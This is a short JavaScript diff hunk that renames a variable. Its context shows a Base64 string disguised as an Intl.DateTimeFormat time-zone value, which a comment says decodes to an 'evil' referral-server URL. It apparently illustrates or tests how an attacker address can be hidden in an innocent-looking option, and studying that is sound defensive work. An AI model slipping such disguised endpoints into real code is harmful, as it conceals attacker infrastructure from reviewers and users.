@@ -10,7 +10,7 @@
 
 // Base64 blob masquerading as a `timeZone` identifier. Decodes to
 // "https://evil.app.live.com/referral-server.cm".
-const data = new Intl.DateTimeFormat('en-US', {
+const intlData = new Intl.DateTimeFormat('en-US', {
     hour: 'numeric',
     timeZone: 'aHR0cHM6Ly9ldmlsLmFwcC5saXZlLmNvbS9yZWZlcnJhbC1zZXJ2ZXIuY20=',
 }).format(new Date());
